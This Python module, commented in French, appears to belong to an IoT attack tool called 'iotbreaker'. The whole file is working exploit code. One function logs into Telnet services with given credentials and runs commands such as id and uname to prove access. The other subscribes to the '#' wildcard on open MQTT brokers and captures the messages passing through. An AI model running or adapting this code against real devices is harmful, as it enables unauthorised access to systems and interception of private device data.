import telnetlib
import paho.mqtt.client as mqtt
import time

def exploit_telnet(ip, username, password):
    """
    Tente d'exécuter une commande simple sur une cible Telnet pour prouver l'accès.
    Retourne le résultat de la commande si l'exploitation réussit.
    """
    print(f"[*] Tentative d'exploitation Telnet sur {ip} avec {username}:{password}...")
    
    # Commandes sûres et non-destructives à essayer
    safe_commands = [b"uname -a", b"id", b"pwd"]
    
    try:
        tn = telnetlib.Telnet(ip, timeout=5)
        # Processus de connexion
        tn.read_until(b"login: ", timeout=3)
        tn.write(username.encode('ascii') + b"\n")
        if password:
            tn.read_until(b"Password: ", timeout=3)
            tn.write(password.encode('ascii') + b"\n")
            
        # Attendre le prompt de connexion
        tn.read_until(b"$", timeout=3)
        
        # Exécuter la première commande sûre qui fonctionne
        for command in safe_commands:
            tn.write(command + b"\n")
            # Lire le résultat de la commande
            output = tn.read_until(b"$", timeout=3).decode('ascii', errors='ignore')
            
            # Si on a un résultat significatif, on a réussi
            if output and command.decode() not in output:
                # On nettoie le résultat pour l'affichage
                clean_output = "\n".join(output.split("\n")[1:-1]).strip()
                success_msg = f"[!] EXPLOIT RÉUSSI: Commande '{command.decode()}' exécutée. Résultat:\n--- DEBUT ---\n{clean_output}\n--- FIN ---"
                print(success_msg)
                tn.close()
                return clean_output
                
        tn.close()
        return None

    except Exception as e:
        print(f"[-] L'exploitation Telnet a échoué: {e}")
        return None 

def exploit_mqtt(ip):
    """
    Tente de s'abonner au topic wildcard '#' sur un serveur MQTT ouvert
    et capture quelques messages pour prouver le flux de données.
    """
    print(f"[*] Tentative d'exploitation MQTT sur {ip}: écoute du topic '#'...")
    captured_messages = []
    def on_connect(client, userdata, flags, rc):
        if rc == 0:
            client.subscribe("#")
        else:
            client.disconnect()
    def on_message(client, userdata, msg):
        payload = msg.payload.decode('utf-8', errors='ignore')
        print(f"  [+] Message reçu sur le topic '{msg.topic}': {payload}")
        captured_messages.append({'topic': msg.topic, 'payload': payload})
        if len(captured_messages) >= 5:
            client.disconnect()
    client = mqtt.Client("iotbreaker_exploit")
    client.on_connect = on_connect
    client.on_message = on_message
    try:
        client.connect(ip, 1883, 5)
        client.loop_start()
        time.sleep(10)
        client.loop_stop()
        if captured_messages:
            print(f"[!] EXPLOIT RÉUSSI: {len(captured_messages)} message(s) ont été intercepté(s) sur le broker MQTT.")
            return captured_messages
        else:
            print("[-] Aucun message n'a été capturé sur le broker MQTT pendant le temps d'écoute.")
            return None
    except Exception as e:
        print(f"[-] L'exploitation MQTT a échoué: {e}")
        return None 